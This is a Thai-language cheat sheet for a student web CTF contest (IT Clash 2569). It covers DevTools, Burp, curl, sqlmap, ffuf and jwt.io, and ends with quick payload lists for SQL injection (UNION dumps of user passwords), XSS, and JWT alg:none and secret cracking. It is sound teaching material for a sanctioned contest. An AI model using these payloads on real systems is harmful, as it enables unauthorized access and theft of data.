# 🚩 CTF Tools — คู่มือ Tools สำหรับทำ Web CTF
> **IT Clash 2569 | Cybersecurity Track**
> โจทย์ทั้งหมดเป็น Web Vulnerability ทำผ่าน browser เป็นหลัก

---

## 📋 สารบัญ
1. [Browser DevTools](#-1-browser-devtools--ฟรีไม่ต้องโหลด)
2. [Burp Suite](#-2-burp-suite--จับและแก้-request)
3. [curl](#-3-curl--ส่ง-http-request-ผ่าน-terminal)
4. [CyberChef](#-4-cyberchef--decode-encode-ทุกอย่าง)
5. [jwt.io](#-5-jwtio--decode-jwt)
6. [sqlmap](#-6-sqlmap--sqli-อัตโนมัติ)
7. [ffuf](#-7-ffuf--หา-hidden-endpoint)
8. [Base64/Hash Tools](#-8-base64--hash-tools)
9. [Strategy ทำ CTF](#-strategy-ทำ-ctf)

---

## 🌐 1. Browser DevTools — ฟรี ไม่ต้องโหลด

> เปิดได้เลยกด **F12** ทุก browser สำคัญมากที่สุดสำหรับ Web CTF

### Network Tab — ดู HTTP Request/Response
```
F12 → Network → เปิดเว็บหรือกด action อะไรสักอย่าง
→ เห็น request ทุกตัวที่ browser ส่งออกไป
→ คลิก request → ดู Headers, Payload, Response

ใช้หา:
✅ API endpoint ที่ซ่อนอยู่
✅ Token ใน header
✅ ข้อมูลที่ส่งไปใน request body
✅ Cookie และ session
```

### Application Tab — ดู Storage
```
F12 → Application → Local Storage / Session Storage / Cookies

ใช้หา:
✅ JWT token ที่เก็บไว้ใน localStorage
✅ Session ID ใน cookie
✅ ข้อมูลที่เก็บฝั่ง browser
```

### Console Tab — รัน JavaScript
```
F12 → Console

ใช้ทำ:
✅ ดึง token: localStorage.getItem("token")
✅ ดู cookie: document.cookie
✅ ทดสอบ XSS: alert(document.cookie)
✅ รัน JavaScript ทดสอบได้เลย
```

### Sources Tab — ดู JavaScript Code
```
F12 → Sources → เลือกไฟล์ .js

ใช้หา:
✅ API endpoint ที่ซ่อนในโค้ด
✅ Logic การ validate ที่ทำ client-side
✅ Secret ที่โปรแกรมเมอร์ลืมลบออก
```

---

## 🔵 2. Burp Suite — จับและแก้ Request

> ติดตั้งแล้วจาก TOOLS_README.md ใช้ร่วมกับ CTF ได้เลย

### วิธีใช้กับ CTF

#### จับ Request แล้วแก้ค่า
```
1. เปิด Burp → Intercept On
2. กด submit form หรือ login บนเว็บ
3. Request ค้างที่ Burp
4. แก้ค่าที่ต้องการ เช่น:
   - เปลี่ยน role=user → role=admin
   - เปลี่ยน id=1 → id=2
   - ใส่ SQLi payload ใน parameter
5. กด Forward ส่งไป
```

#### ส่ง Request ซ้ำหลายรอบ (Repeater)
```
1. จับ request → คลิกขวา → Send to Repeater
2. Tab Repeater → แก้ไข → Send
3. ดู Response ทางขวา
4. ทำซ้ำได้เท่าที่ต้องการ
```

---

## 💻 3. curl — ส่ง HTTP Request ผ่าน Terminal

> ติดตั้งแล้วใน Ubuntu ไม่ต้องโหลดเพิ่ม

### คำสั่งพื้นฐาน

#### GET Request
```bash
# ส่ง GET ธรรมดา
curl http://target.com/api/users

# ส่งพร้อม JWT token
curl -H "Authorization: Bearer eyJ..." http://target.com/api/profile

# ส่งพร้อม Cookie
curl -H "Cookie: session=abc123" http://target.com/dashboard
```

#### POST Request
```bash
# ส่ง JSON body
curl -X POST http://target.com/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"password"}'

# ส่ง form data
curl -X POST http://target.com/login \
  -d "username=admin&password=password"
```

#### ดู Response Header
```bash
# ดู header ทั้งหมด
curl -v http://target.com/api/users

# ดูแค่ header ไม่เอา body
curl -I http://target.com
```

#### เปลี่ยน Method
```bash
# PUT
curl -X PUT http://target.com/api/users/1 \
  -H "Content-Type: application/json" \
  -d '{"role":"admin"}'

# DELETE
curl -X DELETE http://target.com/api/users/1 \
  -H "Authorization: Bearer eyJ..."
```

#### ตัวอย่างใช้กับ CTF
```bash
# ทดสอบ IDOR — เปลี่ยน user id
curl -H "Authorization: Bearer eyJ..." http://target.com/api/users/1
curl -H "Authorization: Bearer eyJ..." http://target.com/api/users/2
curl -H "Authorization: Bearer eyJ..." http://target.com/api/users/3

# ทดสอบ SQLi ใน URL
curl "http://target.com/api/products?id=1'"
curl "http://target.com/api/products?id=1 OR 1=1--"

# ส่ง JWT ที่แก้แล้ว
curl -H "Authorization: Bearer <new_token>" http://target.com/api/admin
```

---

## 🍳 4. CyberChef — Decode/Encode ทุกอย่าง

> เว็บฟรี ใช้ได้เลย ไม่ต้องโหลด

### เปิดใช้งาน
```
เปิด browser → ไปที่ https://cyberchef.org
หรือ Google: "cyberchef"
```

### สิ่งที่ทำได้ใน CTF

#### Base64 Decode
```
Input: SGVsbG8gV29ybGQ=
Recipe: From Base64
Output: Hello World
```

#### URL Decode
```
Input: Hello%20World%21
Recipe: URL Decode
Output: Hello World!
```

#### Hash — MD5/SHA256
```
Input: password
Recipe: MD5
Output: 5f4dcc3b5aa765d61d8327deb882cf99
```

#### JWT Decode (ถ้าไม่มีเน็ต)
```
Input: eyJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoidXNlciJ9.xxx
Recipe: From Base64 (แต่ละส่วนแยกกัน)
→ decode แค่ส่วนที่ 2 (Payload) จะเห็น JSON
```

#### Hex Decode
```
Input: 48656c6c6f
Recipe: From Hex
Output: Hello
```

---

## 🔑 5. jwt.io — Decode JWT

> เว็บฟรี ใช้ได้เลย

### เปิดใช้งาน
```
เปิด browser → https://jwt.io
```

### วิธีใช้
```
1. copy JWT token มาวางในช่อง "Encoded"
2. ด้านขวาจะแสดง:
   - Header: algorithm ที่ใช้
   - Payload: ข้อมูล user
   - Verify Signature: ใส่ secret ถ้ารู้

ใช้หา:
✅ role ของ user ("role":"user" → เปลี่ยนเป็น "admin" ได้ไหม?)
✅ user_id
✅ algorithm ที่ใช้ (HS256, RS256, none)
✅ เวลาหมดอายุ (exp)
```

### ทดลอง Forge Token
```
1. วาง token ใน jwt.io
2. แก้ Payload เช่น "role":"admin"
3. ใส่ secret ในช่อง "your-256-bit-secret"
4. copy token ใหม่จากช่อง "Encoded"
5. ลองใช้ token ใหม่นี้
```

---

## 💉 6. sqlmap — SQLi อัตโนมัติ

> ติดตั้งแล้วจาก TOOLS_README.md

### ใช้กับ CTF

```bash
# โจทย์ CTF มักให้ URL target มา เช่น http://ctf.it.kmitl.ac.th:8001

# ลอง GET parameter
sqlmap -u "http://ctf.it.kmitl.ac.th:8001/products?id=1" \
  --dbms=postgresql \
  --batch \
  --dump-all

# ลอง POST form
sqlmap -u "http://ctf.it.kmitl.ac.th:8001/login" \
  --data="username=admin&password=test" \
  --dbms=postgresql \
  --batch

# ถ้าต้องใส่ token ด้วย
sqlmap -u "http://ctf.it.kmitl.ac.th:8001/api/search?q=test" \
  --headers="Authorization: Bearer eyJ..." \
  --dbms=postgresql \
  --batch \
  --dump-all
```

### หา Flag ใน Database
```bash
# dump ทุกอย่าง แล้วหาคำว่า flag หรือ CTF
sqlmap -u "http://target/api?id=1" --dbms=postgresql --batch --dump-all | grep -i "flag\|ctf\|KMITL"
```

---

## 🔍 7. ffuf — หา Hidden Endpoint

> ติดตั้งแล้วจาก TOOLS_README.md

### ใช้กับ CTF

```bash
# หา directory ที่ซ่อนอยู่
ffuf -u http://ctf-target.com/FUZZ \
  -w wordlists/common.txt \
  -fc 404 \
  -t 50

# หา API endpoint
ffuf -u http://ctf-target.com/api/FUZZ \
  -w wordlists/common.txt \
  -fc 404

# ถ้าต้องใส่ token
ffuf -u http://ctf-target.com/FUZZ \
  -w wordlists/common.txt \
  -H "Authorization: Bearer eyJ..." \
  -fc 404

# ผลลัพธ์ที่น่าสนใจ:
# /admin       → หน้า admin
# /debug       → debug endpoint
# /backup      → backup ไฟล์
# /config      → config ไฟล์
# /api/flag    → อาจเป็นที่เก็บ flag!
```

---

## 🔢 8. Base64 & Hash Tools

### Base64 บน Terminal
```bash
# Encode
echo -n "Hello World" | base64
# Output: SGVsbG8gV29ybGQ=

# Decode
echo "SGVsbG8gV29ybGQ=" | base64 -d
# Output: Hello World

# Decode JWT payload (ส่วนที่ 2)
echo "eyJyb2xlIjoidXNlciIsInVzZXJfaWQiOjF9" | base64 -d
# Output: {"role":"user","user_id":1}
```

### Hash บน Terminal
```bash
# MD5
echo -n "password" | md5sum
# Output: 5f4dcc3b5aa765d61d8327deb882cf99

# SHA256
echo -n "password" | sha256sum

# ใช้หา flag ที่ hash มาแล้ว
echo -n "FLAG{hello}" | md5sum
```

### URL Decode บน Terminal
```bash
python3 -c "import urllib.parse; print(urllib.parse.unquote('Hello%20World'))"
# Output: Hello World
```

---

## 🎯 Strategy ทำ CTF

### ขั้นตอนเมื่อได้โจทย์ใหม่

```
1️⃣  อ่านโจทย์ให้เข้าใจก่อน
     → โจทย์บอกว่าต้องทำอะไร? หา flag ที่ไหน?
     → มีแค่ภาษาอังกฤษก็ Google แปลได้ ✅

2️⃣  เปิดเว็บ target ดูก่อน
     → F12 → Network tab เปิดไว้
     → ดูว่าเว็บทำอะไร มี feature อะไร

3️⃣  Recon ด่วน
     → F12 → Sources → ดู JavaScript มี endpoint ซ่อนไหม
     → F12 → Application → มี token ใน localStorage ไหม
     → ffuf หา hidden directory

4️⃣  ทดสอบช่องโหว่ตามที่เห็น
     → มี input field → ลอง SQLi (' หรือ 1=1--)
     → มี JWT → copy ไป jwt.io decode ดู
     → มี ID ใน URL → ลองเปลี่ยน (IDOR)
     → มี comment/search box → ลอง XSS

5️⃣  ใช้ tools ช่วย
     → sqlmap ถ้าเจอ SQLi
     → jwt_tool ถ้าเจอ JWT
     → Burp Repeater ทดสอบซ้ำๆ

6️⃣  หา Flag
     → Flag มักอยู่ใน database (dump ออกมา)
     → หรืออยู่ใน response หลัง exploit สำเร็จ
     → รูปแบบ: FLAG{...} หรือ KMITL{...}
```

---

### 💡 Tips สำคัญ

```
✅ อ่านโจทย์ให้เข้าใจก่อนทำทุกครั้ง
✅ โจทย์มีข้อย่อย → ทำข้อย่อยง่ายก่อน ได้คะแนนบางส่วนดีกว่าไม่ได้เลย
✅ ติดนาน → ข้ามก่อน กลับมาทีหลัง
✅ Search Google ได้ตลอด ← ใช้ให้เต็มที่!
✅ ทีมแรกที่แก้ได้รับ +10% คะแนน → รีบทำข้อง่ายก่อน

❌ อย่าใช้ Brute Force เร็วๆ กับ CTF platform → โดน ban
❌ อย่าโจมตี website ที่ไม่ใช่โจทย์
❌ ห้ามใช้ AI
```

---

### 🔍 Payload ที่ต้องจำ

#### SQLi Quick Payloads
```sql
-- ทดสอบว่ามีช่องโหว่ไหม
'
1'--
1 OR 1=1--
' OR '1'='1'--

-- UNION dump users
' UNION SELECT null,username,password FROM users--

-- Time-based (PostgreSQL)
'; SELECT pg_sleep(3)--
```

#### XSS Quick Payloads
```html
<!-- ทดสอบพื้นฐาน -->
<script>alert(1)</script>

<!-- ขโมย cookie -->
<script>alert(document.cookie)</script>

<!-- Bypass filter -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

#### JWT Quick Attack
```bash
# 1. Decode ดู payload
python3 jwt_tool/jwt_tool.py <token>

# 2. alg:none
python3 jwt_tool/jwt_tool.py <token> -X a

# 3. Crack secret
python3 jwt_tool/jwt_tool.py <token> -C -d wordlists/passwords.txt
```

---

### 📊 ตารางช่องโหว่ที่เจอบ่อยใน Web CTF

| ช่องโหว่ | สัญญาณที่เห็น | Tool ที่ใช้ |
|---|---|---|
| SQL Injection | มี input ที่ query database | sqlmap, Burp |
| XSS | มี input ที่แสดงผลบนหน้าเว็บ | Browser, Burp |
| JWT Attack | มี token ใน header/storage | jwt_tool, jwt.io |
| IDOR | มี ID ใน URL หรือ body | curl, Bruno, Burp |
| Path Traversal | มี filename/path ใน parameter | curl, Burp |
| Broken Auth | login/auth flow ที่แปลก | Burp, curl |
| Hidden Endpoint | ไม่รู้ว่ามี route อะไรบ้าง | ffuf |

---

*คู่มือนี้จัดทำสำหรับ IT Clash 2569 | Cybersecurity Track*
*โชคดีวันแข่งครับ! 🚩🔥*
